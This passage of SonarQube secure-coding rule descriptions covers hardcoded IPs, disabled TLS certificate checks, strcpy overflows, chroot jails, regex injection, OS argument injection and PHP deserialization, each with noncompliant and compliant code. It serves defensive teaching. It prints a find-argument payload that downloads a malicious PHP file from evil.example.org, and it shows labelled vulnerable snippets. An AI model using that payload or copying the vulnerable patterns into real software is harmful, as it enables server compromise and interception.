have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string host &#61; &#34;10.10.0.1&#34;; // Sensitive
dbi_conn_set_option(conn, &#34;host&#34;, host.c_str());
dbi_conn_set_option(conn, &#34;host&#34;, &#34;10.10.0.1&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string host &#61; getDatabaseHost(); // Compliant
dbi_conn_set_option(conn, &#34;host&#34;, host.c_str()); // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S4830">
              c:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to
use the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks
{
    virtual void tls_verify_cert_chain(
              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,
              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,
              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,
              Botan::Usage_Type usage,
              const std::string &amp;hostname,
              const Botan::TLS::Policy &amp;policy)
    override  { }
};

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/tls_client.h&gt;
#include &lt;botan/tls_callbacks.h&gt;
#include &lt;botan/tls_session_manager.h&gt;
#include &lt;botan/tls_policy.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/certstor.h&gt;
#include &lt;botan/certstor_system.h&gt;

class Callbacks : public Botan::TLS::Callbacks { };

class Client_Credentials : public Botan::Credentials_Manager { };

void connect() {
    Callbacks callbacks;
    Botan::AutoSeeded_RNG rng;
    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);
    Client_Credentials creds;
    Botan::TLS::Strict_Policy policy;

    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,
                              Botan::TLS::Server_Information(&#34;example.com&#34;, 443),
                              Botan::TLS::Protocol_Version::TLS_V12);
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://botan.randombit.net/handbook/" rel="nofollow">Botan</a> - Handbook </li><li> <a href="https://www.feistyduck.com/books/openssl-cookbook/" rel="nofollow">OpenSSL</a> - Cookbook </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5801">
              c:S5801
            </a>
          </td>
          <td>
            <details>
              <p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means
that the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>
character. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving
access to sensitive data or allowing arbitrary code execution.</p>
<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to
<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>
<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and
<code>wcscpy</code>, but they have their own set of issues (see <a href="/organizations/sopra-steria/rules?open&#61;c%3AS5816&amp;rule_key&#61;c%3AS5816" rel="nofollow">S5816</a>), and you should probably prefer another more adapted
alternative.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There is a possibility that either the source or the destination pointer is <code>null</code> </li><li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final
  <code>null</code> character) can be larger than the size of the destination buffer. </li><li> There is an overlap between source and destination </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to
  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and
  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.
  </li><li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in
  FreeBSD </li><li> If you are writing C&#43;&#43; code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
int f(char *src) {
  char dest[256];
  strcpy(dest, src); // Sensitive: might overflow
  return doSomethingWith(dest);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int f(char *src) {
  char *dest &#61; malloc(strlen(src) &#43; 1); // For the final 0
  strcpy(dest, src); // Compliant: we made sure the buffer is large enough
  int r&#61; doSomethingWith(dest);
  free(dest);
  return r;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/HdcxBQ" rel="nofollow">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=c:S5802">
              c:S5802
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of creating a jail, the &#34;virtual root directory&#34; created with chroot-type functions, is to limit access to the file system by isolating
the process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still
access to unauthorized resources outside of the &#34;jail&#34;.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application changes the working directory before or after running chroot. </li><li> The application uses a path inside the jail directory as working directory. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Change the current working directory to the root directory after switching to a jail directory.</p>
<h2>Sensitive Code Example</h2>
<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>
function:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
chroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value
</pre>
<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code
should be checked:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
chroot(root_dir); // Sensitive: missing check of the return value
const char* any_dir &#61; &#34;/any/&#34;;
chdir(any_dir); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the
return code of both functions:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;

if (chdir(root_dir) &#61;&#61; -1) {
  exit(-1);
}

if (chroot(root_dir) &#61;&#61; -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked
  exit(-1);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/243" rel="nofollow">MITRE, CWE-243</a> - Creation of chroot Jail Without Changing Working Directory </li><li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html" rel="nofollow">man7.org</a> - chdir </li><li> <a href="https://man7.org/linux/man-pages/man2/chroot.2.html" rel="nofollow">man7.org</a> - chroot </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S2631">
              phpsecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function lookup(string $data): bool {
  $regex &#61; $_GET[&#34;regex&#34;];
  return preg_match($regex, $data); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function lookup(string $data): bool {
  $regex &#61; $_GET[&#34;regex&#34;];
  return preg_match(preg_quote($regex), $data);
}
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br /> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br />
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2" rel="nofollow">re2</a>.</p>
<p>In the compliant solution, <code>preg_quote</code> escapes metacharacters and escape sequences that could have broken the initially intended
logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">OWASP Regular expression Denial of Service - ReDoS</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5883">
              phpsecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br /> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code uses the <code>find</code> command and expects the user to enter the name of a file to find on the system.</p>
<p>It is vulnerable to argument injection because untrusted data is inserted in the arguments of a process call without prior validation or
sanitization.<br /> Here, the application ignores that a user-submitted parameter might contain special characters that will tamper with the expected
system command behavior.</p>
<p>In this particular case, an attacker might add arbitrary arguments to the <code>find</code> command for malicious purposes. For example, the
following payload will download malicious software on the application’s hosting server.</p>
<pre>
 -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
</pre>
<p>Other standard PHP functions are susceptible to the same vulnerable behavior. Especially, the <code>mail</code> function accepts, as its fifth
argument, parameters that will be appended to the configured mail-sending program command line. This might lead to a similar exploitation
scenario.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$arg&#61;$_GET[&#39;file&#39;];
echo &#34;&lt;h1&gt;File search results:&lt;/h1&gt;&lt;br/&gt;&#34;;
$cmd&#61;escapeshellcmd(&#39;find /tmp/images -iname &#39; . $arg);
passthru($cmd);
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
$arg&#61;$_GET[&#39;arg&#39;];
echo &#34;&lt;h1&gt;Sending test mail.&lt;/h1&gt;&lt;br/&gt;&#34;;
mail(&#34;mail&#64;example.org&#34;, &#34;example subject&#34;, &#34;Example&#34;, [], $arg);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$arg&#61;$_GET[&#39;file&#39;];
echo &#34;&lt;h1&gt;File search results:&lt;/h1&gt;&lt;br/&gt;&#34;;
$cmd&#61;&#39;find /tmp/images -iname &#39; . escapeshellarg($arg);
passthru($cmd);
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
$arg&#61;$_GET[&#39;arg&#39;];
echo &#34;&lt;h1&gt;Sending test mail.&lt;/h1&gt;&lt;br/&gt;&#34;;

$allowed_args_mapping &#61; [&#34;-n&#34;,&#34;-v&#34;];
if (! in_array($arg, $allowed_args_mapping, true)) {
	$arg &#61; &#34;&#34;;
}
mail(&#34;mail&#64;example.org&#34;, &#34;example subject&#34;, &#34;Example&#34;, [], $arg);
</pre>
<h3>How does this work?</h3>
<p>Allowing users to insert data in operating system commands generally creates more problems than it solves.</p>
<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br /> Therefore, our suggestion is to avoid
using OS commands in the first place.</p>
<p>When building a system command from user-submitted data is unavoidable, using the <code>escapeshellarg</code> sanitizing function should be
preferred. It ensures that the provided data will be considered a single argument and prevents the injection of subsequent ones.</p>
<p>It is also important not to combine both <code>escapeshellarg</code> and <code>escapeshellcmd</code>. Indeed, a call to <code>escapeshellcmd</code>
on a complete command line will void any escaping previously added with <code>escapeshellarg</code>.</p>
<p>Therefore, it is impossible to prevent an argument injection issue in the <code>mail</code> function with <code>escapeshellarg</code>. Indeed,
<code>mail</code> internally relies on <code>escapeshellcmd</code> for escaping purposes. In that case, an allowlist of explicitly trusted additional
arguments should be used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" rel="nofollow">OWASP, OS Command Injection Defense
  Cheat Sheet</a> </li><li> <a href="https://gtfobins.github.io/#&#43;shell" rel="nofollow">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://lolbas-project.github.io/#" rel="nofollow">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li><li> <a href="https://blog.sonarsource.com/roundcube-command-execution-via-email/" rel="nofollow">Roundcube 1.2.2: Command Execution via Email</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=phpsecurity:S5135">
              phpsecurity:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br /> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br /> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$cookie &#61; $_COOKIE[&#39;session&#39;];
$session &#61; unserialize($session); // Noncompliant

echo $session-&gt;auth ? &#34;OK&#34; : &#34;KO&#34;;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$cookie &#61; $_COOKIE[&#39;session&#39;];
list($session, $mac) &#61; explode(&#39;|&#39;, $cookie, 2);
$hash &#61; hash_hmac(&#34;sha256&#34;, $session, $KEY);

if (hash_equals($hash, $mac)) {
    $session &#61; unserialize($session);
} else {
    die;
}

echo $session-&gt;auth ? &#34;OK&#34; : &#34;KO&#34;;
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br /> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br />
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br /> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul><li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li><li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li></ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<p>Here, the compliant code example uses the <code>hash_hmac</code> function to compute the integrity tag of the untrusted data. The underlying hash
algorithm is set to <code>sha256</code>, which is considered strong for this use case.</p>
<h4>Pre-Approved classes</h4>
<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br /> If the untrusted class does
not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br /> Depending on the language
or framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>
<h3>Pitfalls</h3>
<h4>Non-constant time authenticity checks</h4>
<p>When using a MAC to validate the authenticity of an untrusted serialized string, it is important to rely on constant time implementations. Indeed,
in most cases, classical string equality check operators work lazily. As soon as a difference is found between two strings, they consider them
different and return. Their response time will therefore vary depending on where the first difference has been found.</p>
<p>In security-sensitive contexts, this difference in execution time leaks information about the secret value being compared. It allows for timing
attacks that could void the authenticity check.</p>
<p>The compliant code example uses the <code>hash_equals</code> function to compare authentication tags. This one benefits from constant-time
implementation.</p>
<h2>Resources</h2>
<h3>Standards</h3>
